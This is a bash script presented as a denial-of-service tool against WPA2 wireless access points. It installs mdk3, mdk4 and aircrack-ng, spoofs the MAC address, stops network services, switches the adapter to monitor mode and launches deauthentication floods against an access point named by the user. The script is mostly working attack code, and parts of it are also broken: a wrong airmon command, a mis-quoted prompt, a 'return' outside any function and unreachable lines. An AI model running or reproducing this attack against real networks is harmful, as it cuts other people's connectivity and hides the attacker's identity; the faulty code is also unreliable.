#!/bin/bash

# $e is for the AP's name 
echo "DOS Attack for WPA2 APS, using airodump, airmon, mdk3 and mdk4"
sleep 1
echo "make sure you have sudo privileges"
sleep 1
echo "Checking if mdk3, mdk4 and aircrack-ng are installed"

mdk3Check=$(sudo apt list --installed | grep mdk3)
mdk4Check=$(sudo apt list --installed | grep mdk4)
aircrackCheck=$(sudo apt list --installed | grep aircrack-ng)

if [ -z "$mdk3Check" ]
then
    echo "mdk3 is not installed"
    read -p "Do you want to install mdk3? (y/n): " mdk3Install
    if [ $mdk3Install == "y" ]
    then
        echo "installing mdk3"
        sudo apt-get install mdk3
    else
        echo "exiting"
        sleep 1
        exit 1
    fi
else
    echo "mdk3 is installed"
fi
if [ -z "$mdk4Check" ]
then
    echo "mdk4 is not installed"
    read -p "Do you want to install mdk4? (y/n): " mdk4Install
    if [ $mdk4Install == "y" ]
    then
        echo "installing mdk4"
        sudo apt-get install mdk4
    else
        echo "exiting"
        sleep 1
        exit 1
    fi
else
    echo "mdk4 is installed"
fi
if [ -z "$aircrackCheck" ]
then
    echo "aircrack-ng is not installed"
    read -p "Do you want to install aircrack-ng? (y/n): " aircrackInstall
    if [ $aircrackInstall == "y" ]
    then
        echo "installing aircrack-ng"
        sudo apt-get install aircrack-ng
    else
        echo "exiting"
        sleep 1
        exit 1
    fi
else
    echo "aircrack-ng is installed"
fi
echo "All dependencies are installed"
sleep 1
read -p "Do you have a wireless adapter? (y/n): " yn
if [ $yn == "y" ]
then
    echo "continuing"
else
    echo "exiting"
    sleep 1
    exit 1
fi
read -p "Enter the AP's name: " AP
sleep 2
echo "The AP's name is: $AP"

echo "setting up the attack"
sudo ifconfig eth0 down 
sudo iwconfig wlan0 down 
sudo macchanger -r wlan0 
sudo systemctl stop wpa_supplicant
sudo systemctl stop NetworkManager
sudo airmon wlan0 start
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
echo "checking if wlan0 is in monitor mode"
monitorCheck=$(iwconfig wlan0 | grep Monitor)
if [ -z "$monitorCheck" ]
then
    echo "wlan0 is not in monitor mode"
    echo "putting wlan0 in monitor mode"
    sudo iwconfig wlan0 mode monitor
else
    echo "wlan0 is in monitor mode"
fi
read -p "which attack do you want to use? mdk3(1), mdk4(2), aireplay-ng(3)?": " attack"
if [ $attack == "1" ]
then
    echo "starting mdk3 attack"
    sudo mdk3 wlan0 d -w $AP
elif [ $attack == "2" ]
then
    echo "starting mdk4 attack"
    sudo mdk4 wlan0 d -w $AP
elif [ $attack == "3" ]
then
    echo "starting aireplay-ng attack"
    sudo airodump-ng -b abg wlan0
else
    echo "invalid input"
    sleep 1
    return 1
fi
sudo airodump-ng -b abg wlan0 > wlans.txt 
return 0 
cat wlans.txt